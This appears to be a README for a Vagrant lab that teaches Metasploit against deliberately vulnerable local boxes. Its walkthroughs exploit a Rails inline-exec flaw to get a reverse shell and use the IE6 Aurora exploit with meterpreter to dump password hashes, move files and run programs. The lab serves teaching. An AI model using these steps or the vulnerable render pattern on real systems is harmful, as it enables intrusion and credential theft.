## metasploit sandbox and tutorials

This is a sandbox for learning and showcasing metasploit, including two tutorials.

Requirements:
  - Vagrant
  - ansible

The Vagrant boxes defined in `Vagrantfile` are:
 - `metasploit` - fully functional metasploit box
 - `target-rails` - a target ubuntu box with a rails app susceptible to exploit/multi/http/rails_actionpack_inline_exec
 - `target-windows` - a target windows box with Internet Explorer 6

To start all boxes, simply run `vagrant up`. It uses ansible for provisioning.

The windows box is a bit crappy as there's no winrm support, so it will say it failed to connect, but it will start.

### Metasploit tutorial - hacking Rails

In this tutorial, we're gonna hack Rails using the `exploit/multi/http/rails_actionpack_inline_exe` exploit.

Essentially, if an rails server passes a parameter to the `render` method to have a "catch-all" endpoint, it's susceptible to this attack, like this:

```
class TargetsController < ActionController::Base

  def index
    render params[:id]
  end

end
```

That's the code of the rails app in `target-rails` uses.

Ok, let's get to hacking. Start the `metasploit` and `target-rails` boxes (`vagrant up metasploit target`).

You'll be asked to choose the bridged network interface, make sure you select the same for both.

Once the boxes boot up, log into `target-rails` (`vagrant ssh target-rails`) and find out its IP (`ifconfig`). It will most likely be in the range of `192.168.1.*`, but it depends. In this tutorial I'll use 192.168.1.123 as an example.

Test the app is running by running curl on the host:

```
$ curl -s http://192.168.1.123:3000 -I | grep HTTP
HTTP/1.1 200 OK
```

Now that we have a running rails app, let's start metasploit. Log into its box (`vagrant ssh metasploit`) and start the console (`msfconsole`).

Once the console loads, search for rails exploits:

```
msf > search rails type:exploit
```

You should see a list which includes `exploit/multi/http/rails_actionpack_inline_exec`. This is the one we're gonna use. To start using it, run

```
msf > use exploit/multi/http/rails_actionpack_inline_exec
```

You'll notice the prompt has changed to reflect that we are currently using that exploit. Run `info` to learn more about the exploit:

```
msf exploit(rails_actionpack_inline_exec) > info
```

This will show you info about the explout, explanation and accepted options. You can also view just the options using `show options`.

Before we run the exploit, we need to configure it. First, set the IP of the target server:

```
msf exploit(rails_actionpack_inline_exec) > set RHOST 192.168.1.123
RHOST => 192.168.1.123
```

Then, set the port - the rails app is running on port 3000:

```
msf exploit(rails_actionpack_inline_exec) > set RPORT 3000
RPORT => 3000
```

Finally, set the endpoint we're going to hit. In our case it's `/targets`

```
msf exploit(rails_actionpack_inline_exec) > set TARGETURI /targets
TARGETURI => /targets
```

That will be enough to fire the exploit. Do it by running `run`.

```
msf exploit(rails_actionpack_inline_exec) > run

[*] Started reverse TCP handler on 192.168.1.122:4444
[*] Sending inline code to parameter: id
[*] Command shell session 1 opened (192.168.1.122:4444 -> 192.168.1.123:33109) at 2017-10-15 10:10:53 +0000
```

At this point it's a bit confusing, as there is no prompt, but we've actually managed to break in. Confirm it by typing `ls /home/vagrant/target` and pressing ENTER:

You should see:

```
app
bin
config
config.ru
db
Gemfile
Gemfile.lock
lib
log
public
Rakefile
README.rdoc
server.pid
tmp
vendor
```

That means we just got access to the machine. Let's use this to extract database information. Type `cat /home/vagrant/target/config/database.yml` and press ENTER. You should see.

```
# SQLite version 3.x
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem 'sqlite3'
development:
adapter: sqlite3
database: db/development.sqlite3
pool: 5
timeout: 5000
```

That way we can extract code, configuration, content, whatever we feel like. This exploit requires that very specific conditions be met and it has been fixed in Rails in 2016. It's especially dangerous, because it requires no action on the victim's part.

### Metasploit tutorial - hacking Windows

In this tutorial, we're gonna hack Windows using the infamous Aurora hack. It's an old hack and with the decline of IE 6 it's very unlikely to still be exploitable, but it fantastically illustrates how exploits work and what can be achieved with them. It's also great for showcasing your friends why security is important and scaring them a little.

Start the `metasploit` and `target-windows` boxes (`vagrant up metasploit target-windows`).

You'll be asked to choose the bridged network interface, make sure you select the same for both.

Windows opens up with a GUI, and once it opens up, find out the ip, by using `Start -> Run... -> cmd (ENTER)` and then `ipconfig /all`. It will most likely be in the range of `192.168.1.*`, but it depends. In this tutorial I'll use 192.168.1.124 as an example.

Hop into metasploit (`vagrant ssh metasploit` and then `msfconsole`). Once loaded, find the aurora exploit. You should find `exploit/windows/browser/ms10_002_aurora`, then run `use exploit/windows/browser/ms10_002_aurora` to start using it.

For this hack, we're going to send a meterpreter reverse tcp payload, which will make the target machine open up a connection to our metasploit instance and start a meterpreter session, allowing us to do bad things to the Windows machine.

To do this, we must have the metasploit box ip which is accessible by the windows machine. To find it, run `ifconfig` in metasploit. You should find the ip which is in the same network as the Windows box. In this tutorial I'll use 192.168.1.122 as an example.

The aurora exploit uses the meterpreter payload, which means we need to configure both. Run `show options` to learn what options must be set.

You'll see that we need to set SRVHOST and LHOST. Let's do this now.

SRVHOST is the host that the exploit will be hosted on - it's the metasploit box ip. In my case, it's 192.168.1.122, so:

```
msf exploit(ms10_002_aurora) > set SRVHOST 192.168.1.122
SRVHOST => 192.168.1.122
```

LHOST is the host the meterpreter payload will connect to - again, it's the metasploit box ip. In my case, it's 192.168.1.122, so:

```
msf exploit(ms10_002_aurora) > set LHOST 192.168.1.122
LHOST => 192.168.1.122
```

After this, we should be ready, so we can `run`:

```
msf exploit(ms10_002_aurora) > run
[*] Exploit running as background job 1.
msf exploit(ms10_002_aurora) >
[*] Started reverse TCP handler on 192.168.1.122:4444
[*] Using URL: http://192.168.1.122:8080/ixvEE2Gu64BtipE
[*] Server started.
```

The exploit is now running in the background. If you press ENTER, you'll notice you're in the metasploit console. To see running background jobs, run `jobs`.

Metasploit has prepared the exploit with the payload and is running a server which is waiting for the victim. Let's give it one.

Switch to the Windows machine, open up Internet Explorer, paste in the URL which was provided by metasploit and press enter.

When you do this, metasploit should print out a few lines, like this:

```
[*] 192.168.1.124    ms10_002_aurora - Sending MS10-002 Microsoft Internet Explorer "Aurora" Memory Corruption
[*] Sending stage (179267 bytes) to 192.168.1.124
[*] Meterpreter session 2 opened (192.168.1.122:4444 -> 192.168.1.124:1047) at 2017-10-15 10:32:10 +0000
```

This means we have successfuly injected the payload into Internet Explorer and started a connection from the victim to metasploit.

Let's open up a meterpreter session to do someting on the victim. Type `sessions` to see all open sessions. You'll probably see just one. Connect to the session by it's id. In my case it's 1, so `sessions -i 1`. You should see the following:

```
msf exploit(ms10_002_aurora) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

We are in a meterpreter session now. Meterpreter is a post-exploitation tool which allows us to actually do something to the victim after we've gained access to the system. Let's try a few things, but before let's make sure our session is not interrupted.

If you go to Windows now, you'll notice that the Internet Explorer is hanging. The exploit put the browser in a broken state and as long as the session is open, it'll stay this way. That means the user might kill the browser, severing our session. To ensure we maintain the connection, we're going to migrate our payload to another process. First, let's find one:

```
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session  User                 Path
 ---   ----  ----              ----  -------  ----                 ----
 ...
 196   188   explorer.exe      x86   0        IE6WINXP\IEUser      C:\WINDOWS\Explorer.EXE
 ...
 ```

explorer.exe is a program that will most likely not close as it's responsible for the user interface and file access. It will work well for us. Use `migrate` to move the payload to that process.

```
meterpreter > migrate 196
[*] Migrating from 880 to 196...
[*] Migration completed successfully.
```

Great, our connection is now safe. You'll notice that once the payload was migrated out of Internet Explorer, it died.

Now, let's see what we can do with meterpreter. First up, let's extract the SAM database:

```
meterpreter > hashdump
```

This will output all users and hashed passwords in the SAM database.

How about downloading a file:

```
meterpreter > download "C:\Documents and Settings\IEUser\ntuser.ini" /home/vagrant/metasploit
[*] Downloading: C:\Documents and Settings\IEUser\ntuser.ini -> /home/vagrant/metasploit/ntuser.ini
[*] Downloaded 178.00 B of 178.00 B (100.0%): C:\Documents and Settings\IEUser\ntuser.ini -> /home/vagrant/metasploit/ntuser.ini
[*] download   : C:\Documents and Settings\IEUser\ntuser.ini -> /home/vagrant/metasploit/ntuser.ini
```

How about uploading a file?

```
meterpreter > upload /home/vagrant/metasploit/LICENSE "C:\Documents and Settings\IEUser\Desktop"
[*] uploading  : /home/vagrant/metasploit/LICENSE -> C:\Documents and Settings\IEUser\Desktop
[*] uploaded   : /home/vagrant/metasploit/LICENSE -> C:\Documents and Settings\IEUser\Desktop\LICENSE
```

You should see a LICENSE file on the Windows maching desktop now.

And finally, my all time favorite, executing programs:

```
meterpreter > execute -f "calc"
Process 1796 created.
```

You should see a brand new Calculator window open up in Windows.

You can check out all other meterpreter commands by running `help`.

This attack is the ultimate attack - all it needs is somebody opening a webpage and gives almost unlimited access to the machine. It allows for file extraction, keylogging, eavesdropping via microphone and/or camera.

That's why it's important to keep your system and software up-to-date, as well as have firewalls reporting about programs which are trying to access the internet but really shouldn't.

### License

License is MIT. See LICENSE for details.

